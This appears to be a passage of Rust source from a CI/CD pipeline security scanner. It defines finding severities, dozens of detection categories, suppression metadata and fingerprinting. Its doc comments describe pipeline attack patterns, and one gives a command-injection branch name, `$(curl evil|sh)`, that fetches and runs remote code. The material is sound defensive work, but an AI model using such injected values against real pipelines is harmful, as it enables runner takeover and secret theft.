use crate::graph::{AuthorityGraph, NodeId, NodeKind};
use crate::propagation::PropagationPath;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::path::PathBuf;

// ── Finding-output enhancements (v0.10) ────────────────────────────
//
// The blue-team corpus defense report (Section 3) recommends a small
// set of additive `Finding` fields that consumers (SIEMs, dashboards,
// triage queues) need but cannot derive cheaply. They are:
//
//   * `finding_group_id`       — stable UUID v5 over (namespace, fingerprint)
//                                 so N hops against one secret cluster into
//                                 a single advisory in downstream tooling.
//   * `time_to_fix`             — coarse remediation effort enum so triage
//                                 dashboards can sort by severity * effort.
//   * `compensating_controls`   — human-readable list of detected controls
//                                 that downgraded the finding's severity.
//   * `suppressed`              — set by the `.taudit-suppressions.yml`
//                                 applicator; preserves audit trail when a
//                                 finding has been waived rather than fixed.
//   * `original_severity`       — pre-downgrade severity; populated whenever
//                                 the suppression applicator OR a compensating
//                                 control modifies `severity`.
//   * `suppression_reason`      — operator-supplied justification from the
//                                 matching `.taudit-suppressions.yml` entry.
//
// All six fields live on `FindingExtras` and are flattened into JSON / SARIF
// output via `#[serde(flatten)]`. New rules can populate them via
// `Finding::with_time_to_fix(...)` / `Finding::with_compensating_controls(...)`
// without touching the 31+ existing rule sites.

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

impl Severity {
    fn rank(self) -> u8 {
        match self {
            Severity::Critical => 0,
            Severity::High => 1,
            Severity::Medium => 2,
            Severity::Low => 3,
            Severity::Info => 4,
        }
    }
}

impl Ord for Severity {
    fn cmp(&self, other: &Self) -> std::cmp::Ordering {
        self.rank().cmp(&other.rank())
    }
}

impl PartialOrd for Severity {
    fn partial_cmp(&self, other: &Self) -> Option<std::cmp::Ordering> {
        Some(self.cmp(other))
    }
}

/// MVP categories (1-5) are derivable from pipeline YAML alone.
/// Stretch categories (6-9) need heuristics or metadata enrichment.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FindingCategory {
    // MVP
    AuthorityPropagation,
    OverPrivilegedIdentity,
    UnpinnedAction,
    UntrustedWithAuthority,
    ArtifactBoundaryCrossing,
    // Stretch — implemented
    FloatingImage,
    LongLivedCredential,
    /// Credential written to disk by a step (e.g. `persistCredentials: true` on a checkout).
    /// Disk-persisted credentials are accessible to all subsequent steps and any process
    /// with filesystem access, unlike runtime-only `HasAccessTo` authority.
    PersistedCredential,
    /// Dangerous trigger type (pull_request_target / pr) combined with secret/identity access.
    TriggerContextMismatch,
    /// Authority (secret/identity) flows into an opaque external workflow via DelegatesTo.
    CrossWorkflowAuthorityChain,
    /// Circular DelegatesTo chain — workflow calls itself transitively.
    AuthorityCycle,
    /// Privileged workflow (OIDC/broad identity) with no provenance attestation step.
    UpliftWithoutAttestation,
    /// Step writes to the environment gate ($GITHUB_ENV, pipeline variables) — authority can propagate.
    SelfMutatingPipeline,
    /// PR-triggered pipeline checks out the repository — attacker-controlled fork code lands on the runner.
    CheckoutSelfPrExposure,
    /// ADO variable group consumed by a PR-triggered job, crossing trust boundary.
    VariableGroupInPrJob,
    /// Self-hosted agent pool used in a PR-triggered job that also checks out the repository.
    SelfHostedPoolPrHijack,
    /// ADO self-hosted pool without workspace isolation (`clean: true`/`all`).
    /// Shared self-hosted agents retain their workspace across pipeline runs.
    /// Without `workspace: { clean: all }`, a PR build can deposit malicious
    /// files that persist for the next (possibly privileged) pipeline run,
    /// enabling workspace poisoning attacks.
    SharedSelfHostedPoolNoIsolation,
    /// Broad-scope ADO service connection reachable from a PR-triggered job without OIDC.
    ServiceConnectionScopeMismatch,
    /// ADO `resources.repositories[]` entry referenced by an `extends:`,
    /// `template: x@alias`, or `checkout: alias` consumer resolves with no
    /// `ref:` (default branch) or a mutable branch ref (`refs/heads/<name>`).
    /// Whoever owns that branch can inject steps into the consuming pipeline.
    TemplateExtendsUnpinnedBranch,
    /// ADO `resources.repositories[]` entry pinned to a feature-class branch
    /// (anything outside the `main` / `master` / `release/*` / `hotfix/*`
    /// platform set). Feature branches typically have weaker push protection
    /// than the trunk, so any developer with write access to that branch can
    /// inject pipeline YAML that runs with the consumer's authority. Strictly
    /// stronger signal than `template_extends_unpinned_branch` — co-fires.
    TemplateRepoRefIsFeatureBranch,
    /// Pipeline step uses an Azure VM remote-exec primitive (Set-AzVMExtension /
    /// CustomScriptExtension, Invoke-AzVMRunCommand, az vm run-command, az vm extension set)
    /// where the executed command line interpolates a pipeline secret or a SAS token —
    /// pipeline-to-VM lateral movement primitive logged in plaintext to the VM and ARM.
    VmRemoteExecViaPipelineSecret,
    /// A SAS token freshly minted in-pipeline is interpolated into a CLI argument
    /// (commandToExecute / scriptArguments / --arguments / -ArgumentList) instead of
    /// passed via env var or stdin — argv ends up in /proc/*/cmdline, ETW, ARM status.
    ShortLivedSasInCommandLine,
    /// Pipeline secret value assigned to a shell variable inside an inline
    /// script (`export VAR=$(SECRET)`, `$X = "$(SECRET)"`). Once the value
    /// transits a shell variable, ADO's `$(SECRET)` log mask no longer
    /// applies — transcripts (`Start-Transcript`, `bash -x`, terraform debug
    /// logs) print the cleartext.
    SecretToInlineScriptEnvExport,
    /// Pipeline secret value written to a file under the agent workspace
    /// (`$(System.DefaultWorkingDirectory)`, `$(Build.SourcesDirectory)`,
    /// or relative paths) without `secureFile` task or chmod 600. The file
    /// persists in the agent workspace and is uploaded by
    /// `PublishPipelineArtifact` and crawlable by later steps.
    SecretMaterialisedToWorkspaceFile,
    /// PowerShell pulls a Key Vault secret with `-AsPlainText` (or
    /// `ConvertFrom-SecureString -AsPlainText`, or older
    /// `.SecretValueText` syntax) into a non-`SecureString` variable. The
    /// value never traverses the ADO variable-group boundary, so verbose
    /// Az/PS logging and error stack traces print the credential.
    ///
    /// Rule id is `keyvault_secret_to_plaintext` (single token "keyvault")
    /// rather than the snake_case derivation `key_vault_…` — matches the
    /// docs filename and the convention used in the corpus evidence.
    #[serde(rename = "keyvault_secret_to_plaintext")]
    KeyVaultSecretToPlaintext,
    /// `terraform apply -auto-approve` against a production-named service connection
    /// without an environment approval gate.
    TerraformAutoApproveInProd,
    /// `AzureCLI@2` task with `addSpnToEnvironment: true` AND an inline script —
    /// the script can launder federated SPN/OIDC tokens into pipeline variables.
    AddSpnWithInlineScript,
    /// A `type: string` pipeline parameter (no `values:` allowlist) is interpolated
    /// via `${{ parameters.X }}` into an inline shell/PowerShell script body —
    /// shell injection vector for anyone with "queue build".
    ParameterInterpolationIntoShell,
    /// A `run:` block fetches a remote script from a mutable URL (`refs/heads/`,
    /// `/main/`, `/master/`) and pipes it directly to a shell interpreter
    /// (`curl … | bash`, `wget … | sh`, `bash <(curl …)`, `deno run https://…`).
    /// Whoever controls that URL's content controls execution on the runner.
    RuntimeScriptFetchedFromFloatingUrl,
    /// Workflow trigger combines high-authority PR events
    /// (`pull_request_target`, `issue_comment`, or `workflow_run`) with a step
    /// whose `uses:` ref is a mutable branch/tag (not a 40-char SHA). Compromise
    /// of the action's default branch yields full repo write on the target repo.
    PrTriggerWithFloatingActionRef,
    /// A `workflow_run`-triggered workflow captures a value from an external
    /// API response (`gh pr view`, `gh api`, `curl api.github.com`) and writes
    /// it into `$GITHUB_ENV`/`$GITHUB_OUTPUT`/`$GITHUB_PATH` without sanitisation.
    /// A poisoned API field (branch name, title) injects environment variables
    /// into every subsequent step in the same job.
    UntrustedApiResponseToEnvSink,
    /// A `pull_request`-triggered workflow logs into a container registry via a
    /// floating (non-SHA-pinned) login action. The compromised action receives
    /// OIDC tokens or registry credentials, and the workflow then pushes a
    /// PR-controlled image to a shared registry.
    PrBuildPushesImageWithFloatingCredentials,
    /// First-party step writes a Secret/Identity-derived value into the
    /// `$GITHUB_ENV` gate (or pipeline-variable equivalent) and a *later*
    /// step in the same job that runs in `Untrusted` or `ThirdParty` trust
    /// zone reads from the runner-managed env (`${{ env.X }}`). The two
    /// component rules — `self_mutating_pipeline` (writer) and
    /// `untrusted_with_authority` (consumer) — each see only half the
    /// chain and emit no finding for the laundered consumer; this rule
    /// closes the composition gap that R2 attack #3 exploited.
    SecretViaEnvGateToUntrustedConsumer,
    /// Positive-invariant rule (GHA): the workflow declares neither a
    /// top-level nor a per-job `permissions:` block, leaving GITHUB_TOKEN at
    /// its broad platform default. Fires once per workflow file.
    NoWorkflowLevelPermissionsBlock,
    /// Positive-invariant rule (ADO): a job referencing a production-named
    /// service connection has no `environment:` binding, so it bypasses the
    /// only ADO-side approval gate regardless of whether `-auto-approve` is
    /// present. Strictly broader than `terraform_auto_approve_in_prod`.
    ProdDeployJobNoEnvironmentGate,
    /// Positive-invariant rule (cross-platform): a long-lived static
    /// credential is in scope but the workflow does not currently use any
    /// OIDC identity even though the target cloud supports federation.
    /// Advisory uplift on top of `long_lived_credential` that wires the
    /// existing `Recommendation::FederateIdentity` variant.
    LongLivedSecretWithoutOidcRecommendation,
    /// Positive-invariant rule (GHA): a PR-triggered workflow has multiple
    /// privileged jobs where SOME have the standard fork-check `if:` and
    /// OTHERS do not. Detects an intra-file inconsistency in defensive
    /// posture — the org has the right instinct but applied it unevenly.
    PullRequestWorkflowInconsistentForkCheck,
    /// Positive-invariant rule (GitLab): a job with a production-named
    /// `environment:` binding has no `rules:` / `only:` clause restricting
    /// it to protected branches. Deploy job runs (or attempts to run) on
    /// every pipeline trigger.
    GitlabDeployJobMissingProtectedBranchOnly,
    /// Two-step ADO chain: an inline script captures a `terraform output`
    /// value (literal `terraform output` CLI invocation or a `$env:TF_OUT_*` /
    /// `$TF_OUT_*` env var sourced from a Terraform CLI task) AND emits a
    /// `##vso[task.setvariable variable=X;...]` directive setting that
    /// captured value into pipeline variable `X`. A subsequent step in the
    /// same job then expands `$(X)` in shell-expansion position
    /// (`bash -c "..."`, `eval`, command substitution `$(...)`, PowerShell
    /// `-split` / `Invoke-Command` / `Invoke-Expression`/`iex`, or as an
    /// unquoted command word). The `task.setvariable` hop launders
    /// attacker-controlled Terraform state — sourced from a remote backend
    /// (S3 bucket, Azure Storage) that often has weaker access controls than
    /// the pipeline itself — through pipeline-variable space and into a
    /// shell interpreter.
    TerraformOutputViaSetvariableShellExpansion,
    /// GHA workflow declares a high-blast-radius trigger (`issue_comment`,
    /// `pull_request_review`, `pull_request_review_comment`, `workflow_run`)
    /// alongside write permissions or non-`GITHUB_TOKEN` secrets. Closes the
    /// gap left by `trigger_context_mismatch` only firing on
    /// `pull_request_target` / ADO `pr`.
    RiskyTriggerWithAuthority,
    /// A `jobs.<id>.outputs.<name>` value is sourced from `secrets.*`, an
    /// OIDC-bearing step output, or has a credential-shaped name. Job outputs
    /// flow unmasked through `needs.<job>.outputs.*` and are written to the
    /// run log — masking is heuristic, never authoritative.
    SensitiveValueInJobOutput,
    /// A `workflow_dispatch.inputs.*` value flows into `curl` / `wget` /
    /// `gh api` / a `run:` URL / `actions/checkout` `ref:`. Anyone with
    /// dispatch permission can pivot the run to attacker-controlled refs or
    /// hosts.
    ManualDispatchInputToUrlOrCommand,
    /// A reusable workflow call uses `secrets: inherit` while the caller is
    /// triggered by an attacker-influenced event (`pull_request`,
    /// `pull_request_target`, `issue_comment`, `workflow_run`). The whole
    /// caller secret bag forwards to the callee regardless of what the callee
    /// actually consumes — every transitive `uses:` in the called workflow
    /// inherits the same scope.
    SecretsInheritOverscopedPassthrough,
    /// A `workflow_run`- or `pull_request_target`-triggered consumer
    /// downloads an artifact from the originating run AND interprets that
    /// artifact's content into a privileged sink (post-to-comment, write to
    /// `$GITHUB_ENV`, `eval`, …). The producer ran in PR context, so a
    /// malicious PR can write arbitrary content into the artifact while the
    /// consumer holds upstream-repo authority.
    UnsafePrArtifactInWorkflowRunConsumer,
    /// A GitHub Actions `run:` block (or `actions/github-script` `script:` body)
    /// interpolates an attacker-controllable expression — `${{ github.event.* }}`,
    /// `${{ github.head_ref }}`, or `${{ inputs.* }}` from a privileged trigger
    /// (`workflow_dispatch` / `workflow_run` / `issue_comment`) — directly into
    /// the script text without first binding through an `env:` indirection.
    /// Classic GitHub Actions remote-code-execution pattern.
    ScriptInjectionViaUntrustedContext,
    /// A workflow that holds non-`GITHUB_TOKEN` secrets or non-default
    /// write permissions includes a step that uses an interactive debug action
    /// (mxschmitt/action-tmate, lhotari/action-upterm, actions/tmate, …).
    /// A maintainer flipping `debug_enabled=true` publishes the runner's full
    /// environment over an external SSH endpoint.
    InteractiveDebugActionInAuthorityWorkflow,
    /// An `actions/cache` step keys the cache on a PR-derived expression
    /// (`github.head_ref`, `github.event.pull_request.head.ref`, `github.actor`)
    /// in a workflow that ALSO runs on `push: branches: [main]` — a PR can
    /// poison the cache that the default-branch build later restores.
    PrSpecificCacheKeyInDefaultBranchConsumer,
    /// A `run:` step uses `gh ` / `gh api` with the default `GITHUB_TOKEN` to
    /// perform a write-class action (`pr merge`, `release create/upload`,
    /// `api -X POST/PATCH/PUT/DELETE` to `/repos/.../{contents,releases,actions/secrets,environments}`)
    /// inside a workflow triggered by `pull_request`, `issue_comment`, or
    /// `workflow_run` — runtime privilege escalation that static permission
    /// checks miss.
    GhCliWithDefaultTokenEscalating,
    /// GitLab CI `$CI_JOB_TOKEN` (or `gitlab-ci-token:$CI_JOB_TOKEN`) used as a
    /// bearer credential against an external HTTP API or fed to `docker login`
    /// for `registry.gitlab.com`. CI_JOB_TOKEN's default scope (registry write,
    /// package upload, project read) means a poisoned MR job that emits the
    /// token to a webhook can pivot to package/registry pushes elsewhere.
    CiJobTokenToExternalApi,
    /// GitLab CI `id_tokens:` declares an `aud:` audience that is reused across
    /// MR-context and protected-context jobs (no audience separation), or is a
    /// wildcard / multi-cloud broker URL. The audience is what trades for
    /// downstream cloud creds — a single shared `aud` means any job that
    /// compromises the token assumes the most-privileged role any other job
    /// uses.
    IdTokenAudienceOverscoped,
    /// Direct shell interpolation of attacker-controlled GitLab predefined
    /// vars (`$CI_COMMIT_BRANCH`, `$CI_COMMIT_REF_NAME`, `$CI_COMMIT_TAG`,
    /// `$CI_COMMIT_MESSAGE`, `$CI_COMMIT_TITLE`, `$CI_MERGE_REQUEST_TITLE`,
    /// `$CI_MERGE_REQUEST_DESCRIPTION`,
    /// `$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`, `$CI_COMMIT_AUTHOR`) into
    /// `script:` / `before_script:` / `after_script:` / `environment:url:`
    /// without single-quote isolation. A branch named `` $(curl evil|sh) ``
    /// executes inside the runner. GitLab generalisation of the GHA
    /// `script_injection_via_untrusted_context` class.
    UntrustedCiVarInShellInterpolation,
    /// A GitLab `include:` references (a) a `remote:` URL pointing at a
    /// branch (`/-/raw/<branch>/...`), (b) a `project:` with `ref:` resolving
    /// to a mutable branch name (main/master/develop), or (c) an include with
    /// no `ref:` at all (defaults to HEAD). Whoever owns that branch can
    /// backdoor every consumer's pipeline silently — included YAML executes
    /// with the consumer's secrets and CI_JOB_TOKEN.
    UnpinnedIncludeRemoteOrBranchRef,
    /// A GitLab job declares a `services: [docker:*-dind]` sidecar AND holds
    /// at least one non-CI_JOB_TOKEN secret (registry creds, deploy keys,
    /// signing keys, vault id_tokens). docker-in-docker exposes the full
    /// Docker socket inside the job container — a malicious build step can
    /// `docker run -v /:/host` from inside dind and read the runner host
    /// filesystem (other jobs' artifacts, cached creds).
    DindServiceGrantsHostAuthority,
    /// A GitLab job whose name or `extends:` matches scanner patterns
    /// (`sast`, `dast`, `secret_detection`, `dependency_scanning`,
    /// `container_scanning`, `gitleaks`, `trivy`, `grype`, `semgrep`, etc.)
    /// runs with `allow_failure: true` AND has no `rules:` clause that
    /// surfaces the failure. The pipeline goes green even when the scan
    /// errors out — silent-pass is worse than no scan because reviewers trust
    /// the badge.
    SecurityJobSilentlySkipped,
    /// A GitLab `trigger:` job (downstream / child pipeline) runs in
    /// `merge_request_event` context OR uses `include: artifact:` from a
    /// previous job (dynamic child pipeline). Dynamic child pipelines are a
    /// code-injection sink — anything the build step writes to the artifact
    /// runs as a real pipeline with the parent project's secrets.
    ChildPipelineTriggerInheritsAuthority,
    /// A GitLab `cache:` declaration whose `key:` is hardcoded, `$CI_JOB_NAME`
    /// only, or `$CI_COMMIT_REF_SLUG` without a `policy: pull` restriction.
    /// Caches are stored per-runner keyed by `key:`; a poisoned MR can push a
    /// malicious `node_modules/` cache that the next default-branch job
    /// downloads and executes during `npm install`.
    CacheKeyCrossesTrustBoundary,
    /// A CI script constructs an HTTPS git URL with embedded credentials
    /// (`https://user:$TOKEN@host/...`) before invoking `git clone`,
    /// `git push`, or `git remote set-url`. The credential is exposed
    /// in the process argv (visible to `ps`, `/proc/*/cmdline`), persists
    /// in `.git/config` for the rest of the job, and may be uploaded as
    /// part of any artifact that bundles the workspace.
    PatEmbeddedInGitRemoteUrl,
    /// A CI job triggers a different project's pipeline via the GitLab
    /// REST API using `CI_JOB_TOKEN` and forwards user-influenced variables
    /// through the `variables[KEY]=value` query/form parameter. The
    /// downstream project's security depends on the trust contract between
    /// the two projects — variable values flowing across that boundary
    /// constitute a cross-project authority bridge.
    CiTokenTriggersDownstreamWithVariablePassthrough,
    /// A GitLab job emits an `artifacts.reports.dotenv: <file>` artifact
    /// whose contents become pipeline variables for any consumer linked
    /// via `needs:` or `dependencies:`. A consumer in a later stage that
    /// targets a production-named environment inherits those variables
    /// transparently — no explicit download is visible at the job level.
    /// When the producer reads attacker-influenced inputs (branch names,
    /// commit messages), the dotenv flow is a covert privilege escalation
    /// channel into the deployment job.
    DotenvArtifactFlowsToPrivilegedDeployment,
    /// ADO inline script sets a sensitive-named pipeline variable via
    /// `##vso[task.setvariable variable=<NAME>]` with `issecret=false` or
    /// without the `issecret` flag at all. Without `issecret=true` the
    /// variable value is printed in plaintext to the pipeline log and is
    /// not masked in downstream step output.
    SetvariableIssecretFalse,
    /// A GHA `uses:` action reference contains a non-ASCII character —
    /// possible Unicode confusable / homoglyph impersonating a trusted
    /// action (e.g. Cyrillic `a` instead of Latin `a`, or U+2215
    /// DIVISION SLASH instead of U+002F SOLIDUS).
    HomoglyphInActionRef,
    // Reserved — requires ADO/GH API enrichment beyond pipeline YAML
    /// Requires runtime network telemetry or policy enrichment — not detectable from YAML alone.
    #[doc(hidden)]
    EgressBlindspot,
    /// Requires external audit-sink configuration data — not detectable from YAML alone.
    #[doc(hidden)]
    MissingAuditTrail,
}

/// Routing: scope findings -> TsafeRemediation; isolation findings -> CellosRemediation.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum Recommendation {
    TsafeRemediation {
        command: String,
        explanation: String,
    },
    CellosRemediation {
        reason: String,
        spec_hint: String,
    },
    PinAction {
        current: String,
        pinned: String,
    },
    ReducePermissions {
        current: String,
        minimum: String,
    },
    FederateIdentity {
        static_secret: String,
        oidc_provider: String,
    },
    Manual {
        action: String,
    },
}

/// Provenance of a finding — distinguishes findings emitted by built-in
/// taudit rules from findings emitted by user-loaded custom invariant YAML
/// (`--invariants-dir`). Custom rules can emit arbitrarily-worded findings
/// at any severity, so an operator piping output into a JIRA workflow or
/// SARIF upload needs a non-spoofable signal of which file the rule came
/// from. Serializes as `"built-in"` (string) for built-in findings and
/// `{"custom": "<path>"}` for custom-rule findings — see
/// `docs/finding-fingerprint.md` for the contract.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FindingSource {
    /// Emitted by a built-in rule defined in `taudit-core::rules`. The
    /// authoritative trust anchor — the binary's release commit defines the
    /// rule logic. Serialises as the kebab-case string `"built-in"` to match
    /// `schemas/finding.v1.json`.
    #[default]
    #[serde(rename = "built-in")]
    BuiltIn,
    /// Emitted by a custom invariant rule loaded from the given YAML file.
    /// The path is the file the rule was loaded from, retained so operators
    /// can audit which file produced any given finding.
    Custom { source_file: PathBuf },
}

impl FindingSource {
    /// True for findings emitted by built-in rules.
    pub fn is_built_in(&self) -> bool {
        matches!(self, FindingSource::BuiltIn)
    }
}

/// Coarse-grained remediation effort. Surfaces in JSON `time_to_fix` and SARIF
/// `properties.timeToFix` so triage dashboards can sort by `severity * effort`.
///
/// The four buckets are deliberately wide. Precise time estimates would invite
/// argument; the buckets exist to separate "flip a flag" from "rewrite a job"
/// from "renegotiate ops policy".
///
/// Per `MEMORY/.../blueteam-corpus-defense.md` Section 3 / Enhancement E-3.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FixEffort {
    /// ~5 minutes. Mechanical change to a single file (flip a flag, pin a SHA,
    /// add a `permissions: {}` block). No structural risk.
    Trivial,
    /// ~1 hour. Refactor a step or job: split a script, add a fork-check,
    /// move a secret to an environment binding.
    Small,
    /// ~1 day. Restructure a job or pipeline: introduce an environment gate,
    /// move from inline scripts to a sandboxed action, add an OIDC role.
    Medium,
    /// ~1 week or more. Operational policy change: migrate from PATs to OIDC
    /// across an org, change branch protection model, retire a service principal.
    Large,
}

/// Optional finding metadata. Lives on every `Finding` via
/// `#[serde(flatten)]` so consumers see the fields at the top of the
/// finding object — same place they'd appear if declared inline on
/// `Finding`. Default-constructed extras serialize to nothing (all
/// `Option::None` and empty `Vec`s skip-serialize), so existing
/// snapshots remain byte-stable until a rule populates a field.
///
/// **Why a wrapper struct?** The 30+ rule call sites use struct
/// literal syntax. Adding fields directly to `Finding` would force
/// every site to edit. With `extras: FindingExtras::default()`, new
/// extras can be added in a single place.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct FindingExtras {
    /// Stable UUID v5 over `(NAMESPACE, fingerprint)` — collapses
    /// per-hop findings against the same authority root into one group
    /// for SIEM display. See `compute_finding_group_id`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub finding_group_id: Option<String>,

    /// Coarse remediation effort. See `FixEffort`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub time_to_fix: Option<FixEffort>,

    /// Human-readable list of controls that already neutralise (or partially
    /// neutralise) this finding — populated when a compensating-control
    /// detector downgrades severity. Empty when no downgrade applied.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub compensating_controls: Vec<String>,

    /// Set to `true` by the suppression applicator when a matching
    /// `.taudit-suppressions.yml` entry exists AND the configured mode
    /// is `Suppress`. The finding still appears in output (audit trail
    /// preserved) but consumers can filter on this field.
    #[serde(default, skip_serializing_if = "is_false")]
    pub suppressed: bool,

    /// Original pre-downgrade severity. Populated by the suppression
    /// applicator OR a compensating-control detector when `severity`
    /// is mutated. `None` means the current severity is the rule-emitted
    /// value.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub original_severity: Option<Severity>,

    /// Operator-supplied justification from the matching suppression
    /// entry. `None` when no suppression applies.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub suppression_reason: Option<String>,
}

#[allow(clippy::trivially_copy_pass_by_ref)]
fn is_false(b: &bool) -> bool {
    !*b
}

/// A finding is a concrete, actionable authority issue.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    pub severity: Severity,
    pub category: FindingCategory,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub path: Option<PropagationPath>,
    pub nodes_involved: Vec<NodeId>,
    pub message: String,
    pub recommendation: Recommendation,
    /// Provenance of this finding. Defaults to `BuiltIn` for backward
    /// compatibility with code/JSON that predates the field — every
    /// in-tree built-in rule sets this explicitly. Deserialization of older
    /// JSON without the field treats the finding as built-in.
    #[serde(default)]
    pub source: FindingSource,
    /// Optional metadata (group id, time-to-fix, compensating controls,
    /// suppression markers). Flattens into the JSON object so consumers
    /// see top-level fields — see `FindingExtras` for individual semantics.
    #[serde(flatten, default)]
    pub extras: FindingExtras,
}

impl Finding {
    /// Builder helper: attach a `time_to_fix` annotation to this finding.
    /// Call sites: `let f = Finding { ... }.with_time_to_fix(FixEffort::Trivial);`
    pub fn with_time_to_fix(mut self, effort: FixEffort) -> Self {
        self.extras.time_to_fix = Some(effort);
        self
    }

    /// Builder helper: append a compensating control description and
    /// downgrade severity by one tier (Critical -> High -> Medium -> Low -> Info).
    /// Records the original severity so the audit trail survives.
    pub fn with_compensating_control(mut self, control: impl Into<String>) -> Self {
        let original = self.severity;
        self.extras.compensating_controls.push(control.into());
        self.severity = downgrade_severity(self.severity);
        if self.extras.original_severity.is_none() {
            self.extras.original_severity = Some(original);
        }
        self
    }
}

/// Move severity one rank toward `Info` (Critical -> High -> ... -> Info).
/// `Info` stays `Info`. Used by both the suppression applicator and
/// compensating-control detectors.
pub fn downgrade_severity(s: Severity) -> Severity {
    match s {
        Severity::Critical => Severity::High,
        Severity::High => Severity::Medium,
        Severity::Medium => Severity::Low,
        Severity::Low => Severity::Info,
        Severity::Info => Severity::Info,
    }
}

/// Stable UUID v5 over the finding fingerprint. Two findings whose
/// fingerprints match (same rule + file + root authority) produce the
/// same `finding_group_id` — that is the whole point: SIEMs and triage
/// dashboards collapse N hops against a single secret into one row.
///
/// The UUID v5 namespace is a fixed UUID v4 derived once and embedded
/// here. Treating the namespace as load-bearing is intentional: any
/// future change here would break every consumer that has stored a
/// `finding_group_id`. Bump only at a major version.
pub fn compute_finding_group_id(fingerprint: &str) -> String {
    // UUID v5 = SHA-1(namespace || name), with version + variant bits set.
    // Implemented inline so taudit-core stays free of the `uuid` crate
    // dependency (workspace already depends on it from the CLI; core
    // remains zero-IO and minimal).
    const NAMESPACE: [u8; 16] = [
        0x6c, 0x6f, 0xd0, 0xa3, 0x82, 0x44, 0x4f, 0x29, 0xb1, 0x9a, 0x09, 0xc8, 0x7e, 0x49, 0x55,
        0x21,
    ];

    use sha1::{Digest as Sha1Digest, Sha1};
    let mut hasher = Sha1::new();
    Sha1Digest::update(&mut hasher, NAMESPACE);
    Sha1Digest::update(&mut hasher, fingerprint.as_bytes());
    let hash = hasher.finalize();

    let mut bytes = [0u8; 16];
    bytes.copy_from_slice(&hash[..16]);
    // RFC 4122 §4.3: set version to 5 (bits 12-15 of time_hi_and_version)
    bytes[6] = (bytes[6] & 0x0f) | 0x50;
    // RFC 4122 §4.4: set variant to RFC 4122 (bits 6-7 of clock_seq_hi)
    bytes[8] = (bytes[8] & 0x3f) | 0x80;

    format!(
        "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
        bytes[0], bytes[1], bytes[2], bytes[3],
        bytes[4], bytes[5],
        bytes[6], bytes[7],
        bytes[8], bytes[9],
        bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15],
    )
}

// ── Finding fingerprint ────────────────────────────────────
//
// Stable cross-run identifier for a finding. Surfaces in:
//
//   * SARIF `partialFingerprints[primaryLocationLineHash]`
//   * JSON  `findings[].fingerprint`
//   * CloudEvents extension attribute `tauditfindingfingerprint`
//
// SIEMs / suppression DBs / dedup pipelines key on this value to
// recognise "same finding seen on previous run". See
// `docs/finding-fingerprint.md` for the full contract.

/// Pull a custom-rule id out of a finding message of the form
/// `[<id>] rest of message`. Returns `None` if the message does not start
/// with a bracketed id. Mirrors the matching helper in
/// `taudit-report-sarif`; kept private so the surface stays minimal.
fn extract_custom_rule_id(message: &str) -> Option<&str> {
    if !message.starts_with('[') {
        return None;
    }
    let end = message.find(']')?;
    let id = &message[1..end];
    if id.is_empty() {
        None
    } else {
        Some(id)
    }
}

/// Snake-case rule id derived from a `FindingCategory`. Delegates to
/// serde so the value tracks the serialized form across renames.
fn category_rule_id(category: &FindingCategory) -> String {
    serde_json::to_value(category)
        .ok()
        .and_then(|v| v.as_str().map(str::to_string))
        .unwrap_or_else(|| "unknown".to_string())
}

/// Public, stable rule-id resolver for a finding.
///
/// Returns the snake_case rule id reported alongside this finding. When the
/// finding's message starts with a bracketed custom-rule prefix
/// (`[my_rule] ...`), the bracketed id wins so custom YAML rules surface
/// their declared id. Otherwise the rule id is the snake_case form of the
/// finding's `category` (the same string serde uses to serialize the
/// category enum).
///
/// JSON, SARIF, and CloudEvents emitters all share this helper to ensure
/// the `rule_id` field is identical across the three sinks.
pub fn rule_id_for(finding: &Finding) -> String {
    extract_custom_rule_id(&finding.message)
        .map(str::to_string)
        .unwrap_or_else(|| category_rule_id(&finding.category))
}

/// Compute a stable cross-run fingerprint for a finding.
///
/// The fingerprint identifies "the same logical issue" across re-runs and
/// across non-cosmetic edits to the surrounding pipeline. Two runs against
/// the same input file produce the same fingerprint; a fix to the
/// underlying issue makes the fingerprint disappear; a tweak to the
/// finding's user-facing message does NOT change the fingerprint.
///
/// **Algorithm version `v2`** (replaces v1 from v0.9.1).
///
/// v1 collapsed every per-hop finding against the same root Secret/Identity
/// onto a single fingerprint. That hides genuinely distinct issues — two
/// untrusted steps reaching the same secret are two separate
/// remediation-distinct findings, not one. v2 makes every component of the
/// finding contribute to the hash so unrelated findings cannot alias.
///
/// **Inputs (sensitive to):**
///   * Rule id — either a custom rule id parsed from a `[id] …` message
///     prefix, or the snake_case form of `finding.category`
///   * Source file path (`graph.source.file`) — verbatim, never normalised
///     to a basename, so two pipelines named the same file in different
///     directories never collide
///   * Finding category (snake_case)
///   * Root-authority node name — Secret/Identity name when one is
///     involved, empty string otherwise. Surfaces the credential identity
///     in the SIEM context column without being the only differentiator.
///   * Ordered involved-node names — every node in `nodes_involved`,
///     joined in original order (preserves caller intent so per-hop
///     findings against the same secret produce distinct fingerprints).
///
/// **Inputs (insensitive to):**
///   * Wall-clock time
///   * The finding's `message` text — operators tweak phrasing without
///     wanting suppressions to break
///   * `taudit` version string
///   * Environment / host / cwd
///   * Pipeline file content hash — only the path matters
///
